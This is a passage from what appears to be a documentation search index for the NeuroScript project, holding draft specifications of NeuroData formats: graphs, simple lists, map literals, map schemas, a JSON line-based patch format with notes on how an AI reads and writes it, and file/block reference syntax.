optional_whitespace \"```\" [ language_tag ] newline { text_line } optional_whitespace \"```\" newline ;\nlanguage_tag      ::= identifier ;\ntext_line         ::= any_character_except_backticks newline ;\n\nidentifier        ::= letter { letter | digit | \"_\" } ;\nletter            ::= \"a..z\" | \"A..Z\" | \"_\" ;\ndigit             ::= \"0..9\" ;\nsimple_string     ::= (letter | digit | \"_\" | \"-\")+ ;\n\n(* Standard definitions needed: number_literal, boolean_literal, string_literal, whitespace, newline, comment_line, blank_line *)\n</code></pre> (Note: This EBNF is a draft.)</p>"},{"location":"NeuroData/graph/#4-rendering","title":"4. Rendering","text":"<p>Tools can parse this format and render it into other graphical representations like DOT (Graphviz), JSON Graph Format, GML, etc. The rendering mechanism is separate from this specification.</p>"},{"location":"NeuroData/graph/#5-example","title":"5. Example","text":"<pre><code>:: type: Graph\n:: version: 0.1.1\n:: id: example-graph-props\n:: directed: true\n:: description: Example with simple and complex properties.\n\nNODE StartNode [label: \"Start\", shape: \"circle\", initial_value: 0]\n  # Edges for StartNode\n  -&gt; MidNode [weight: 2.1]\n  -- AltNode # Undirected\n\nNODE MidNode [label: \"Processing\"]\n  # Complex properties via attached JSON block\n  ```json\n  {\n    \"retries\": 3,\n    \"timeout_ms\": 5000,\n    \"parameters\": {\"alpha\": 0.5, \"beta\": 0.1}\n  }\n  ```\n  # Edges for MidNode\n  &lt;- StartNode [weight: 2.1]\n  -&gt; EndNode [label: \"Success\"]\n\nNODE EndNode [label: \"End\", shape: \"doublecircle\"]\n  &lt;- MidNode [label: \"Success\"]\n\nNODE AltNode [status: \"alternative\"]\n  -- StartNode # Undirected\n</code></pre>"},{"location":"NeuroData/list/","title":"NeuroData Simple List Format (.ndlist) Specification","text":"<p>:: type: ListFormatSpec :: version: 0.1.0 :: status: draft :: dependsOn: docs/metadata.md, docs/references.md, docs/NeuroData/checklist.md, docs/neurodata_and_composite_file_spec.md :: howToUpdate: Refine syntax, parsing options, tooling descriptions, EBNF, examples.</p>"},{"location":"NeuroData/list/#1-purpose","title":"1. Purpose","text":"<p>NeuroData Simple Lists (<code>.ndlist</code>) provide a minimal, human-readable plain-text format for representing ordered or hierarchical lists of items, primarily intended for simple text entries or references. It serves as a simpler alternative to the NeuroData Checklist format [cite: uploaded:neuroscript/docs/NeuroData/checklist.md] when status tracking (<code>[ ]</code>, <code>[x]</code>) is not required.</p>"},{"location":"NeuroData/list/#2-relation-to-checklist-format-ndcl","title":"2. Relation to Checklist Format (<code>.ndcl</code>)","text":"<p>The <code>.ndlist</code> format uses a syntax visually similar to <code>.ndcl</code> but removes the status marker (<code>[...]</code> or <code>|...|</code>). It focuses purely on the list items and their hierarchical structure (if any), indicated by indentation.</p>"},{"location":"NeuroData/list/#3-syntax","title":"3. Syntax","text":"<p>An <code>.ndlist</code> file or block consists of: 1.  Optional file-level metadata lines (using <code>:: key: value</code> syntax [cite: uploaded:neuroscript/docs/metadata.md]). 2.  Optional comments (<code>#</code> or <code>--</code>) and blank lines. 3.  A series of list item lines.</p>"},{"location":"NeuroData/list/#31-fileblock-level-metadata","title":"3.1 File/Block-Level Metadata","text":"<p>Standard <code>:: key: value</code> lines [cite: uploaded:neuroscript/docs/metadata.md]. Recommended metadata includes: * <code>:: type: SimpleList</code> (or <code>ItemList</code>) (Required) * <code>:: version: &lt;semver&gt;</code> (Required) * <code>:: id: &lt;unique_list_id&gt;</code> (Optional if referenced) * <code>:: description: &lt;text&gt;</code> (Optional)</p>"},{"location":"NeuroData/list/#32-list-item-line","title":"3.2 List Item Line","text":"<ul> <li>Format: <code>Indentation - Item Text</code></li> <li><code>Indentation</code>: Zero or more spaces or tabs. The level of indentation defines the item's parent in the hierarchy (the nearest preceding item line with less indentation). Consistent indentation is recommended.</li> <li><code>-</code>: A literal hyphen followed by a single space MUST precede the item text.</li> <li><code>Item Text</code>: The content of the list item. This is treated as a raw string and can include any characters, including NeuroScript References (<code>[ref:...]</code> [cite: generated previously in <code>docs/references.md</code>]). Leading/trailing whitespace after the required space is part of the item text.</li> </ul>"},{"location":"NeuroData/list/#33-comments-and-blank-lines","title":"3.3 Comments and Blank Lines","text":"<p>Lines starting with <code>#</code> or <code>--</code> (after optional whitespace) are comments and are ignored by the parser. Blank lines are also ignored and do not typically contribute to the structure, although tools could optionally preserve them if needed for specific rendering.</p>"},{"location":"NeuroData/list/#4-ebnf-grammar-draft","title":"4. EBNF Grammar (Draft)","text":"<pre><code>list_file         ::= { metadata_line | comment_line | blank_line } { list_item_line } ;\n\nmetadata_line     ::= optional_whitespace \"::\" whitespace key \":\" value newline ; (* As per references spec *)\n\nlist_item_line    ::= indentation \"-\" whitespace item_text newline ;\nindentation       ::= { \" \" | \"\\t\" } ; (* Parsed to determine level *)\nitem_text         ::= rest_of_line ; (* Raw text content *)\n\n(* Define: key, value, rest_of_line, whitespace, newline, comment_line, blank_line *)\n</code></pre>"},{"location":"NeuroData/list/#5-tool-interaction","title":"5. Tool Interaction","text":"<p>Interaction with <code>.ndlist</code> data primarily involves parsing the content into a usable structure.</p> <ul> <li>Parsing (<code>TOOL.ParseList</code> - hypothetical): A dedicated tool would parse the <code>.ndlist</code> content (provided as a string or via a <code>[ref:...]</code>).<ul> <li>Input: <code>list_content_or_ref</code> (String or Reference)</li> <li>Options (Optional):<ul> <li><code>output_format</code> (String): <code>\"hierarchy\"</code> (default), <code>\"flat_text\"</code>, <code>\"flat_indent\"</code>.</li> </ul> </li> <li>Output:<ul> <li>Default (<code>\"hierarchy\"</code>): Returns a nested structure representing the tree inferred from indentation (e.g., a list of maps, where each map has <code>\"text\"</code> and <code>\"children\"</code> keys).</li> <li><code>\"flat_text\"</code>: Returns a simple flat list of strings, containing the text of each item in document order.</li> <li><code>\"flat_indent\"</code>: Returns a flat list of maps, where each map contains <code>{\"text\": string, \"indent\": int}</code>.</li> </ul> </li> <li>Reference Handling: The parser reads <code>Item Text</code> literally. It does not automatically resolve <code>[ref:...]</code> strings found within item text. Resolution must be handled by subsequent steps in the calling NeuroScript procedure if needed.</li> </ul> </li> <li>Hierarchy Check (<code>TOOL.IsListHierarchical</code> - hypothetical): A potential helper tool, as you suggested (perhaps named like this), could take the parsed data (e.g., the output from <code>TOOL.ParseList</code> in <code>\"flat_indent\"</code> format) and return <code>true</code> if items have varying indentation levels, <code>false</code> otherwise. This confirms if a list uses nesting.</li> </ul>"},{"location":"NeuroData/list/#6-example","title":"6. Example","text":"<pre><code>:: type: SimpleList\n:: version: 0.1.0\n:: description: List of relevant specification documents.\n\n- Core Language\n  - [ref:docs/script spec.md]\n  - [ref:docs/formal script spec.md]\n- NeuroData Formats\n  - [ref:docs/NeuroData/checklist.md]\n  - [ref:docs/neurodata/table.md]\n  - [ref:docs/neurodata/graph.md]\n  - [ref:docs/neurodata/tree.md]\n  - [ref:docs/neurodata/form.md]\n  - [ref:this] # Reference to this list spec itself\n- Supporting Concepts\n  - [ref:docs/metadata.md]\n  - [ref:docs/references.md]\n- Tooling\n  - [ref:pkg/core/interpreter.go]\n  - [ref:pkg/neurogo/app.go]\n</code></pre>"},{"location":"NeuroData/map_literal/","title":"Map Literal","text":"<p>:: version: 0.1.0 :: type: NSproject :: subtype: spec :: dependsOn: docs/metadata.md, docs/script spec.md, docs/neurodata_and_composite_file_spec.md :: howToUpdate: Review dependency specs (NS map literals) and update syntax/examples if they change.</p>"},{"location":"NeuroData/map_literal/#neuroscript-map-literal-data-format-ns-map-literal-specification","title":"NeuroScript Map Literal Data Format (<code>ns-map-literal</code>) Specification","text":""},{"location":"NeuroData/map_literal/#1-purpose","title":"1. Purpose","text":"<p>This specification defines how to represent structured key-value data using the native NeuroScript map literal syntax, typically embedded within a fenced code block in a composite document (like Markdown). This format is intended for scenarios where structured data (like configuration, definitions, or simple object representations) needs to be associated with other content, leveraging the existing NeuroScript parser rather than introducing external formats like YAML or JSON.</p>"},{"location":"NeuroData/map_literal/#2-relation-to-neuroscript","title":"2. Relation to NeuroScript","text":"<p>The content of an <code>ns-map-literal</code> block is a single, valid NeuroScript map literal expression. Its syntax and semantics are directly governed by the NeuroScript Language Specification's definition of map literals [script spec.md].</p>"},{"location":"NeuroData/map_literal/#3-syntax","title":"3. Syntax","text":"<p>An <code>ns-map-literal</code> data block consists of: 1.  An opening fence: <code>```ns-map-literal</code> or <code>```neuroscript-map</code> (using <code>ns-map-literal</code> is recommended for clarity). 2.  Optional block-level metadata lines (using <code>:: key: value</code> syntax [metadata.md]). Recommended metadata includes <code>:: type: MapLiteralData</code> and <code>:: version: &lt;semver&gt;</code>. 3.  Optional comments (<code>#</code> or <code>--</code>) and blank lines. 4.  A single NeuroScript map literal expression: <code>{ \"key1\": &lt;value_expr1&gt;, \"key2\": &lt;value_expr2&gt;, ... }</code>.     * Keys must be string literals (<code>\"...\"</code> or <code>'...'</code>).     * Values can be any valid NeuroScript expression (literals: string, number, boolean; nested lists <code>[...]</code>; nested maps <code>{...}</code>). Note that variables or function calls within these value expressions are typically not evaluated when simply parsing the data structure; evaluation context depends on the tool consuming the map literal. 5.  A closing fence: <code>```</code>.</p>"},{"location":"NeuroData/map_literal/#4-parsing-and-tooling","title":"4. Parsing and Tooling","text":"<p>Tools encountering a block tagged <code>ns-map-literal</code> should: 1.  Extract the content within the fences. 2.  Parse the content using the NeuroScript expression parser, specifically targeting the <code>map_literal</code> rule [formal script spec.md]. 3.  The result of the parse should be an Abstract Syntax Tree (AST) representation of the map literal, or an equivalent data structure (like Go's <code>map[string]interface{}</code>) representing the nested key-value pairs and literals found within. 4.  Further interpretation or evaluation of expressions within the map's values depends on the consuming tool's specific requirements.</p>"},{"location":"NeuroData/map_literal/#5-example","title":"5. Example","text":"<pre><code>Some context...\n\n```ns-map-literal\n:: type: MapLiteralData\n:: version: 1.0.0\n:: id: term-definitions-example\n\n# Example map literal holding term definitions\n{\n  \"TermA\": {\n    \"description\": \"The first term.\",\n    \"reference\": \"[ref:./glossary.md#term-a]\",\n    \"value_type\": \"string\"\n  },\n  \"TermB\": {\n    \"description\": \"The second term, with a list.\",\n    \"aliases\": [\"AliasB1\", \"AliasB2\"],\n    \"value_type\": \"integer\"\n  },\n  \"TermC\": {\n    \"description\": \"A boolean flag.\" , # Example comment within map\n    \"value_type\": \"boolean\",\n    \"default\": true\n  }\n}\n</code></pre> <p>More context... ```</p>"},{"location":"NeuroData/map_schema/","title":"Map Schema","text":"<p>:: type: NSproject :: subtype: spec :: version: 0.1.0 :: id: ndmap-schema-spec :: status: draft :: dependsOn: docs/metadata.md, docs/script spec.md, docs/NeuroData/map_literal.md, docs/NeuroData/references.md :: howToUpdate: Review syntax, especially enum definitions and TYPE references, for clarity and consistency with other specs.</p>"},{"location":"NeuroData/map_schema/#neurodata-map-schema-format-ndmap_schema-specification","title":"NeuroData Map Schema Format (.ndmap_schema) Specification","text":""},{"location":"NeuroData/map_schema/#1-purpose","title":"1. Purpose","text":"<p>NeuroData Map Schema (<code>.ndmap_schema</code>) defines the expected structure, constraints, and documentation for key-value data represented using the NeuroScript Map Literal Data Format [map_literal.md]. It acts as a schema, allowing tools to validate map literal instances, understand the purpose of different keys, enforce required fields, and manage named, reusable enumerated value lists with descriptions. It prioritizes simplicity and readability, borrowing syntax conventions from other NeuroData formats like <code>.ndform</code> and <code>.ndtable</code>.</p>"},{"location":"NeuroData/map_schema/#2-example","title":"2. Example","text":"<pre><code># File: docs/NeuroData/schemas/metadata_schema.ndmap_schema\n\n:: type: NSMapSchema\n:: version: 0.1.0\n:: id: basic-metadata-schema\n:: description: Defines common metadata keys using named enums.\n:: depth: 1 # Default depth limit for values\n\n# --- Enum Definitions ---\n\nDEFINE ENUM LifecycleStatus\n  VALUE \"draft\"\n    DESC \"Initial, non-final version.\"\n  VALUE \"review\"\n    DESC \"Ready for review.\"\n  VALUE \"approved\"\n    DESC \"Finalized and approved.\"\n  VALUE \"deprecated\"\n    DESC \"No longer recommended.\"\n\nDEFINE ENUM ContentType\n  VALUE \"NSproject\"\n    DESC \"General project file.\"\n  VALUE \"NeuroScript\"\n    DESC \"Executable NeuroScript code.\"\n  # ... other types ...\n\n# --- Key Definitions ---\n\nKEY \"version\" # Keys are strings\n  DESC \"Semantic version.\"\n  TYPE string\n  REQUIRED true\n\nKEY \"type\"\n  DESC \"Primary type of the file/block content.\"\n  TYPE enum(ContentType) # Reference the defined enum\n  REQUIRED true\n\nKEY \"status\"\n  DESC \"Lifecycle status.\"\n  TYPE enum(LifecycleStatus) # Reference the defined enum\n  REQUIRED false\n\nKEY \"author_details\"\n  DESC \"Information about the author.\"\n  TYPE [ref:author-schema] # Reference another schema for nested structure\n  REQUIRED false\n  # DEPTH constraint could be defined in author-schema instead\n</code></pre> <pre><code># Example data instance conforming to the schema above\n{\n  \"version\": \"1.2.3\",\n  \"type\": \"NeuroScript\",\n  \"status\": \"approved\",\n  \"author_details\": { \"name\": \"A. Turing\", \"email\": \"alan@example.com\" } # Assumes author-schema defines name &amp; email\n}\n</code></pre>"},{"location":"NeuroData/map_schema/#3-syntax","title":"3. Syntax","text":"<p>An <code>.ndmap_schema</code> file consists of the following sections: 1.  File-Level Metadata: Optional <code>:: key: value</code> lines [metadata.md]. Recommended metadata includes <code>:: type: NSMapSchema</code>, <code>:: version: &lt;semver&gt;</code>, <code>:: id: &lt;schema_id&gt;</code>, and optionally <code>:: depth: &lt;number&gt;</code> to limit overall nesting. 2.  Enum Definitions (Optional): Zero or more <code>DEFINE ENUM</code> blocks, each defining a named, reusable list of allowed values and their descriptions. 3.  Key Definitions: One or more <code>KEY</code> definitions describing the expected keys in the map literal data and the constraints on their associated values. 4.  Comments/Blank Lines: Allowed between metadata and definitions, and between definitions (<code>#</code> or <code>--</code>).</p>"},{"location":"NeuroData/map_schema/#31-file-level-metadata","title":"3.1 File-Level Metadata","text":"<p>Standard <code>:: key: value</code> lines [metadata.md]. Recommended: * <code>:: type: NSMapSchema</code> (Required) * <code>:: version: &lt;semver&gt;</code> (Required) * <code>:: id: &lt;unique_schema_id&gt;</code> (Required if referenced) * <code>:: description: &lt;text&gt;</code> (Optional) * <code>:: depth: &lt;number&gt;</code> (Optional) - If present, suggests a maximum nesting depth for the entire map structure defined by this schema. Validation tools may use this.</p>"},{"location":"NeuroData/map_schema/#32-enum-definition-define-enum","title":"3.2 Enum Definition (<code>DEFINE ENUM</code>)","text":"<ul> <li>Format:   <pre><code>DEFINE ENUM &lt;enum_name&gt;\n  VALUE \"&lt;enum_value_1&gt;\"\n    DESC \"&lt;Description of enum_value_1&gt;\"\n  VALUE \"&lt;enum_value_2&gt;\"\n    DESC \"&lt;Description of enum_value_2&gt;\"\n  # ... more VALUE/DESC pairs\n</code></pre></li> <li><code>DEFINE ENUM &lt;enum_name&gt;</code>: Starts the definition. <code>&lt;enum_name&gt;</code> must be a unique identifier within the schema file (<code>[a-zA-Z_][a-zA-Z0-9_]*</code>).</li> <li><code>VALUE \"&lt;enum_value_string&gt;\"</code>: (Indented) Defines an allowed literal value for the enum (typically a string).</li> <li><code>DESC \"&lt;description&gt;\"</code>: (Indented further) Provides the human-readable description for the preceding <code>VALUE</code>. This is crucial for understanding the enum's meaning.</li> </ul>"},{"location":"NeuroData/map_schema/#33-key-definition-key","title":"3.3 Key Definition (<code>KEY</code>)","text":"<ul> <li>Format:   <pre><code>KEY \"&lt;key_name_string&gt;\"\n  # Indented attribute lines\n  DESC \"&lt;description&gt;\"\n  TYPE &lt;type_spec&gt;\n  REQUIRED &lt;true|false&gt;\n  DEPTH &lt;number&gt; # Optional depth limit for this key's value\n</code></pre></li> <li><code>KEY \"&lt;key_name_string&gt;\"</code>: Starts the definition. <code>&lt;key_name_string&gt;</code> is the literal string key expected in the map data instance.</li> <li>Attribute Lines (Indented): Define properties and constraints for the value associated with this key.<ul> <li><code>DESC \"&lt;description&gt;\"</code>: (Recommended) Human-readable description of the key's purpose.</li> <li><code>TYPE &lt;type_spec&gt;</code>: (Required) Specifies the expected data type or enum reference for the value. Supported types:<ul> <li>Base types: <code>string</code>, <code>int</code>, <code>float</code>, <code>bool</code>, <code>list</code>, <code>map</code>, <code>any</code>.</li> <li>Enum reference: <code>enum(&lt;enum_name&gt;)</code> - References a named enum defined elsewhere in the file using <code>DEFINE ENUM &lt;enum_name&gt;</code>. The value must match one of the <code>VALUE</code>s defined in that enum.</li> <li>Schema reference: <code>[ref:&lt;schema_id&gt;]</code> or <code>[ref:path/to/schema.ndmap_schema]</code> - Indicates the value should be a map conforming to another <code>.ndmap_schema</code> schema (used for defining nested structures).</li> </ul> </li> <li><code>REQUIRED &lt;true|false&gt;</code>: (Optional) Specifies if the key must be present in the map data instance. Defaults to <code>false</code>.</li> <li><code>DEPTH &lt;number&gt;</code>: (Optional) Specifies the maximum nesting depth allowed specifically for the value of this key (relevant if <code>TYPE</code> is <code>list</code>, <code>map</code>, <code>any</code>, or references another schema). Overrides file-level <code>:: depth</code> for this key.</li> </ul> </li> </ul>"},{"location":"NeuroData/map_schema/#4-tooling-interaction","title":"4. Tooling Interaction","text":"<p>Tools interacting with <code>ns-map-literal</code> data and <code>.ndmap_schema</code> schemas should: 1.  Parse the <code>.ndmap_schema</code> schema file to understand the expected structure, types, required keys, and enum definitions. 2.  Parse the <code>ns-map-literal</code> data block using the NeuroScript expression parser. 3.  Validation: Compare the parsed map literal data against the parsed schema:     * Check for missing required keys.     * Check if all present keys are defined in the schema (optional strict mode).     * Validate the data type of each value against the <code>TYPE</code> specified in the schema.     * If <code>TYPE</code> is <code>enum(&lt;name&gt;)</code>, verify the value exists in the named <code>DEFINE ENUM</code> block.     * If <code>TYPE</code> is <code>[ref:...]</code>, recursively validate the nested map value against the referenced schema.     * Enforce <code>DEPTH</code> constraints if specified. 4.  Documentation/UI: Use the <code>DESC</code> attributes from the schema (for both keys and enum values) to provide context to users or generate documentation.</p>"},{"location":"NeuroData/patch/","title":"Patch","text":"<p>:: type: NeuroData :: subtype: spec :: version: 0.1.0 :: id: ndpatch-json-spec-0.1.0 :: status: draft :: dependsOn: docs/metadata.md, docs/specification_structure.md :: howToUpdate: Review format based on usage by patching tools or AI. Update version for non-trivial changes.</p>"},{"location":"NeuroData/patch/#neuroscript-json-patch-format-specification-ndpatchjson","title":"NeuroScript JSON Patch Format Specification (<code>ndpatch.json</code>)","text":""},{"location":"NeuroData/patch/#1-purpose","title":"1. Purpose","text":"<p>This specification defines the <code>ndpatch.json</code> format, a JSON-based structure for representing individual file modification operations (replacements, insertions, deletions) using line numbers. It is intended as an alternative to standard diff/patch formats, particularly where robustness against intermediate formatting changes (e.g., in UI transfers) is desired, while still allowing for precise, location-based changes. Each object in the top-level array represents a single operation on a specific file. The recommended file extension is <code>.ndpatch.json</code>.</p>"},{"location":"NeuroData/patch/#2-example","title":"2. Example","text":"<p>This example shows three separate operations: a replace, an insert, and a delete, potentially targeting the same file but represented as individual objects in the array.</p> <pre><code>[\n  {\n    \"file\": \"path/to/your/file.txt\",\n    \"line\": 8,\n    \"op\": \"replace\",\n    \"old\": \"This is the original line 8 content.\",\n    \"new\": \"This is the new content replacing line 8.\"\n  },\n  {\n    \"file\": \"path/to/your/file.txt\",\n    \"line\": 5,\n    \"op\": \"insert\",\n    \"new\": \"This new line will be inserted before the original line 5.\"\n  },\n  {\n    \"file\": \"path/to/your/file.txt\",\n    \"line\": 10,\n    \"op\": \"delete\",\n    \"old\": \"This original line 10 content will be deleted.\"\n  }\n]\n</code></pre>"},{"location":"NeuroData/patch/#3-design-choices-rationale-optional","title":"3. Design Choices / Rationale (Optional)","text":"<ul> <li>JSON Structure: Chosen for its widespread support and robustness in representing string content.</li> <li>Array of Operations: Each object represents a single change, simplifying generation but requiring the applying tool to handle operations sequentially and manage state (like line number shifts) across operations targeting the same file.</li> <li>Line Numbers: Included for precise location of changes. Using 1-based indexing is conventional.</li> <li><code>old</code> field for Verification: Provides an optional safety check for <code>replace</code> and <code>delete</code>.</li> <li>Alternative to Standard Patch: Addresses potential corruption issues of standard diff formats during transfer.</li> <li>Tool Incompatibility: Acknowledged trade-off is incompatibility with standard <code>patch</code> and <code>git apply</code> tools. Requires custom application logic.</li> </ul>"},{"location":"NeuroData/patch/#4-syntax-format-definition","title":"4. Syntax / Format Definition","text":"<p>The format consists of a single top-level JSON array <code>[...]</code>. Each element within the array is an \"Operation Object\" representing a single modification to a file.</p>"},{"location":"NeuroData/patch/#41-operation-object-structure","title":"4.1 Operation Object Structure","text":"<p>Each object within the top-level array represents a single modification and has the following keys:</p> <ul> <li><code>file</code>: (String, Required)<ul> <li>The relative path to the target file that needs modification. Path should be relative to a common root (e.g., project root).</li> </ul> </li> <li><code>line</code>: (Integer, Required)<ul> <li>The 1-based line number in the target file where the operation should occur, relative to the state of the file before this specific operation is applied within the overall sequence of operations in the array.</li> <li>For <code>replace</code>: The line number to be replaced.</li> <li>For <code>insert</code>: The line number before which the <code>new</code> content should be inserted. The inserted content will become the new line at this number.</li> <li>For <code>delete</code>: The line number to be deleted.</li> </ul> </li> <li><code>op</code>: (String, Required)<ul> <li>Specifies the type of modification. Must be one of: <code>\"replace\"</code>, <code>\"insert\"</code>, <code>\"delete\"</code>.</li> </ul> </li> <li><code>old</code>: (String, Optional but Recommended for <code>replace</code>/<code>delete</code>)<ul> <li>The expected original content of the line identified by <code>line</code>. Used by applying tools for verification before modifying the file. Should be omitted or null for <code>insert</code>. Example name in test data: <code>\"original_line_for_reference\"</code>.</li> </ul> </li> <li><code>new</code>: (String, Required for <code>replace</code>/<code>insert</code>)<ul> <li>Contains the full text, including any leading/trailing whitespace and line ending characters (typically <code>\\n</code>), for the line that should replace the existing line (<code>replace</code>) or be inserted (<code>insert</code>). Should be omitted or null for <code>delete</code>. Example name in test data: <code>\"new_line_content\"</code>.</li> </ul> </li> </ul>"},{"location":"NeuroData/patch/#5-ebnf-grammar-optional","title":"5. EBNF Grammar (Optional)","text":"<p>Not applicable. The structure is defined by JSON syntax.</p>"},{"location":"NeuroData/patch/#6-ai-reading","title":"6. AI Reading","text":"<ul> <li>Understand this format describes a sequence of individual changes to files using line numbers.</li> <li>Each object in the top-level array is a self-contained operation specifying the <code>file</code>, <code>line</code>, <code>op</code>, optional <code>old</code> content, and required <code>new</code> content (for replace/insert).</li> <li>Recognize that operations should be applied sequentially as they appear in the array.</li> <li>Crucially, understand that line numbers (<code>line</code>) refer to the file state before the specific operation is applied. When multiple operations target the same file, the applying tool must track line number shifts.</li> </ul>"},{"location":"NeuroData/patch/#7-ai-writing","title":"7. AI Writing","text":"<ul> <li>When generating patches in this format:<ul> <li>Ensure the top-level structure is a JSON array <code>[...]</code>.</li> <li>Each element in the array must be an object representing a single operation.</li> <li>Each operation object must have <code>file</code> (string), <code>line</code> (integer &gt;= 1), and <code>operation</code> (string: \"replace\", \"insert\", or \"delete\").</li> <li>For <code>replace</code>, include <code>old</code> (string, recommended) and <code>new</code> (string).</li> <li>For <code>insert</code>, include <code>new</code> (string) and omit <code>old</code>.</li> <li>For <code>delete</code>, include <code>old</code> (string, recommended) and omit <code>new</code>.</li> <li>Verify <code>old</code> content matches the target line when providing it.</li> <li>Ensure <code>new</code> content is the complete desired line.</li> <li>Calculate line numbers based on the original file state relative to where the change needs to happen, considering the logical sequence of operations already added to the patch array.</li> </ul> </li> </ul>"},{"location":"NeuroData/patch/#8-tooling-requirements-interaction-optional","title":"8. Tooling Requirements / Interaction (Optional)","text":"<ul> <li>Incompatibility: Standard tools like <code>patch</code> or <code>git apply</code> cannot parse or apply this format.</li> <li>Parsing: Requires a standard JSON parser.</li> <li>Application Logic: Custom tooling (e.g., <code>nspatch.go</code> [cite: uploaded:neuroscript_small/pkg/nspatch/nspatch.go]) is required. The tool must:<ul> <li>Process the operation objects in the top-level array strictly sequentially.</li> <li>For each operation:<ul> <li>Identify the target <code>file</code>.</li> <li>Read the file content if not already in memory for that file (or maintain the modified state in memory if multiple operations target the same file).</li> <li>Maintain an internal <code>line_offset</code> counter per file, initialized to 0 when the file is first encountered. This offset tracks how insertions (+) or deletions (-) have shifted subsequent line numbers relative to the original file.</li> <li>Calculate the <code>adjusted_line_number = operation.line + line_offset</code>. This is the actual index (0-based) in the current state of the line list being modified for that specific file.</li> <li>Verification (Optional but Recommended): If <code>old</code> is provided for <code>replace</code> or <code>delete</code>, check if the content at <code>adjusted_line_number</code> matches <code>old</code>. If not, report an error and potentially skip the operation or halt processing.</li> <li>Perform Operation:<ul> <li><code>replace</code>: Modify the line at <code>adjusted_line_number</code> with <code>new</code>. (No change to <code>line_offset</code>).</li> <li><code>insert</code>: Insert <code>new</code> content before the line at <code>adjusted_line_number</code>. Increment the <code>line_offset</code> for that file by 1.</li> <li><code>delete</code>: Remove the line at <code>adjusted_line_number</code>. Decrement the <code>line_offset</code> for that file by 1.</li> </ul> </li> <li>Error Handling: Handle cases where <code>adjusted_line_number</code> is out of bounds for the current state of the file's line list.</li> </ul> </li> <li>After processing all operations, write the final modified content back to all affected files.</li> </ul> </li> <li>Whitespace/Line Endings: Preservation relies on <code>old</code>/<code>new</code> strings being correctly represented in JSON and handled correctly by the applying tool. Assume <code>\\n</code> line endings unless specified otherwise.</li> </ul>"},{"location":"NeuroData/references/","title":"NeuroScript References Specification","text":"<p>:: type: Specification :: version: 0.1.2 :: status: draft :: dependsOn: docs/metadata.md, docs/neurodata_and_composite_file_spec.md, pkg/core/security.go, pkg/neurodata/blocks/blocks_extractor.go :: howToUpdate: Ensure syntax definitions for both file and block refs are clear, examples are accurate, path restrictions are explicit.</p>"},{"location":"NeuroData/references/#1-purpose","title":"1. Purpose","text":"<p>This document defines a standard, consistent syntax for referencing specific resources within a NeuroScript project. This includes referencing entire files or specific fenced code/data blocks within those files. This allows for reliable linking between documentation, metadata, scripts, and data, promoting portability and maintainability.</p>"},{"location":"NeuroData/references/#2-syntax","title":"2. Syntax","text":"<p>The standard format for a reference is enclosed in square brackets and begins with <code>ref:</code>:</p> <ol> <li>File Reference: <code>[ref:&lt;location&gt;]</code></li> <li>Block Reference: <code>[ref:&lt;location&gt;#&lt;block_id&gt;]</code></li> </ol> <p>Components: * <code>[</code> and <code>]</code>: Square brackets enclose the entire reference. * <code>ref:</code>: A mandatory literal prefix indicating that this is a NeuroScript reference, distinguishing it from other uses of square brackets (like properties or list literals). * <code>&lt;location&gt;</code>: Specifies the file containing the target resource. This MUST be one of the following:     * <code>this</code>: A special keyword referring to the current file where the reference itself resides.     * A relative file path (e.g., <code>../data/users.ndtable</code>, <code>sibling_script.ns.txt</code>). Paths MUST use forward slashes (<code>/</code>) as separators. Relative paths are strongly recommended for portability. Absolute paths are disallowed in this syntax. Path validation using security routines (like <code>SecureFilePath</code> [cite: uploaded:neuroscript/pkg/core/security.go]) should still be performed by tools resolving these references based on their context (e.g., current working directory or sandbox root). * <code>#&lt;block_id&gt;</code> (Optional): If present, this part indicates a reference to a specific block within the file.     * <code>#</code>: A mandatory separator character when referencing a block. Its absence indicates a reference to the entire file.     * <code>&lt;block_id&gt;</code>: The unique identifier of the target block within its file. This identifier MUST correspond to the value defined in the block's <code>:: id:</code> metadata tag [cite: uploaded:neuroscript/docs/metadata.md]. Block IDs should be unique within their containing file. Tools resolving block references will rely on the <code>:: id:</code> metadata found by block extraction mechanisms [cite: uploaded:neuroscript/pkg/neurodata/blocks/blocks_extractor.go].</p>"},{"location":"NeuroData/references/#3-nesting","title":"3. Nesting","text":"<p>This specification currently only defines references to top-level blocks within a file. A syntax or convention for referencing blocks nested within other blocks is not defined at this time and may require extensions to block extraction tools. File references (<code>[ref:&lt;location&gt;]</code>) naturally do not involve nesting.</p>"},{"location":"NeuroData/references/#4-tooling","title":"4. Tooling","text":"<p>Tools interacting with NeuroScript files and NeuroData formats need to be able to parse this reference syntax and resolve it appropriately based on the presence or absence of the <code>#&lt;block_id&gt;</code> component. * References without <code>#&lt;block_id&gt;</code> (e.g., <code>[ref:config.yaml]</code>) typically imply reading or identifying the entire file content. Tools like <code>TOOL.ReadFile</code> might implicitly accept this format, or a dedicated <code>TOOL.ResolveReference</code> could be used. * References with <code>#&lt;block_id&gt;</code> (e.g., <code>[ref:this#setup]</code>) require tools to read the file, extract blocks (using logic similar to <code>TOOL.BlocksExtractAll</code> [cite: uploaded:neuroscript/pkg/neurodata/blocks/blocks_tool.go]), and find the specific block by its <code>:: id:</code>. * A potential future tool, <code>TOOL.GetBlockFromString(content_string, block_id)</code>, could extract a block by ID directly from string content held in a variable. * Path validation using security routines [cite: uploaded:neuroscript/pkg/core/security.go] must always be applied when the <code>&lt;location&gt;</code> refers to a file path.</p>"},{"location":"NeuroData/references/#5-usage-examples","title":"5. Usage Examples","text":"<p>References can be used in various contexts:</p> <ul> <li>Metadata: <pre><code>:: dependsOn: [ref:this#section-2], [ref:../schemas/user.ndtable], [ref:../schemas/common.ns.txt#validation-rules]\n:: template: [ref:templates/base.md]\n</code></pre></li> <li>NeuroScript Code: <pre><code>SET config_content = CALL TOOL.ReadFile(\"[ref:config.yaml]\")\nSET template_code = CALL TOOL.GetBlockFromFile(\"[ref:this#template-code]\") # Hypothetical tool\nCALL TOOL.ApplySchema(\"[ref:schemas/data_schema.json]\", input_data)\n</code></pre></li> <li>Documentation (Markdown Links): <pre><code>See the [API Specification](ref:../api/spec_v1.md) or the specific [User Endpoint details](ref:../api/spec_v1.md#user-endpoint).\n(Alternative: Source file is [ref:main.go], main logic is [ref:this#main-logic])\n</code></pre></li> <li>NeuroData Files: <pre><code>NODE ScriptRunner [script: \"[ref:../scripts/run.ns.txt#main-proc]\"]\nNODE DataLoader [source_file: \"[ref:data/input.csv]\"]\n</code></pre></li> </ul>"},{"location":"NeuroData/references/#6-examples-of-reference-strings","title":"6. Examples of Reference Strings","text":"<ul> <li>File References:<ul> <li><code>[ref:this]</code> - 